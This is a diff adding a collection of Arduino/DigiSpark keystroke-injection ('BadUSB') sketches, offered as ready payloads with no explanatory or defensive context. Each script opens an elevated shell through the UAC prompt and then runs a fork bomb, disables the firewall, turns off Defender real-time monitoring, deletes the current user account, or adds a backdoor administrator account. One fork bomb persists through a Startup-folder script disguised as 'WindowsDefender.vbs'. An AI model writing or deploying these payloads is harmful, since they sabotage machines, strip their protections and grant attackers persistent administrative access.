@@ -1,0 +1,270 @@
+//PrivilegeEscalationCMD
+#include <DigiKeyboard.h>
+void setup() {
+pe();
+}
+void loop() {
+}
+void pe() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+}
+
+//PrivilegeEscalationPowerShell
+#include <DigiKeyboard.h>
+void setup() {
+pe();
+}
+void loop() {
+}
+void pe() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process powershell /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+}
+
+//ForkBomb1
+#include <DigiKeyboard.h>
+void setup(){
+  qf();
+}
+void loop(){
+}
+void qf() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.print ("cd %USERPROFILE% ^^ cd Documents");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print ("erase &Q WindowsDefender.bat");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print ("copy con WindowsDefender.bat");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print ("%0`%0");
+  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print ("WindowsDefender.bat");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+//DisableFirewall
+#include <DigiKeyboard.h>
+void setup() {
+df();
+}
+void loop() {
+}
+void df() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("netsh firewall set opmode disable");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+//ForkBomb2
+#include <DigiKeyboard.h>
+void setup() {
+df();
+}
+void loop() {
+}
+void df() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd %ProgramData%");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd Microsoft");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd Windows");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd Start Menu");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd Programs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd Startup");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("erase &Q WindowsDefender.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("copy con WindowsDefender.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("do");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("CreateObject*");
+  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
+  DigiKeyboard.print("Wscript.Shell");
+  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
+  DigiKeyboard.print("(.Run ");
+  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
+  DigiKeyboard.print(", 0, False");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("loop");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("start WindowsDefender.vbs ^^ exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+}
+
+//payload6
+#include <DigiKeyboard.h>
+void setup() {
+df();
+}
+void loop() {
+}
+void df() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("netsh advfirewall set currentprofile state off");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+//payload7
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+void setup() {
+df();
+}
+void loop() {
+}
+void df(){
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process powershell /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (7000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("Set/MpPreference /DisableRealtimeMonitoring $true");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
+
+#include <DigiKeyboard.h>
+void setup() {
+df();
+}
+void loop() {
+}
+void df() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("net user %USERNAME% &delete");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+#include <DigiKeyboard.h>
+void setup() {
+df();
+}
+void loop() {
+}
+void df() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay (1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay (500);
+  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay (7000);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("net user user1 1234 &add");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("net localgroup administradores user1 &add");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
